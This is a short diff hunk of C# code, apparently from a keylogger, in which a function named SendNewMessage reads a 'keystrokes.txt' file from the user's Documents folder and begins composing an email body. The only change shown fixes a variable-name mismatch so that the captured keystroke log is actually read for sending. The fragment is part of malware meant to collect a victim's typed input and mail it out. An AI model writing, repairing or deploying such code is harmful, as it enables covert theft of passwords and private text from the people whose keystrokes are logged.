@@ -71,7 +71,7 @@ static void SendNewMessage()
 string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 string filepath = folderName + @"\keystrokes.txt";
 
-String logContents = File.ReadAllText(filePath);
+String logContents = File.ReadAllText(filepath);
 string emailBody="";
 
 //create email address
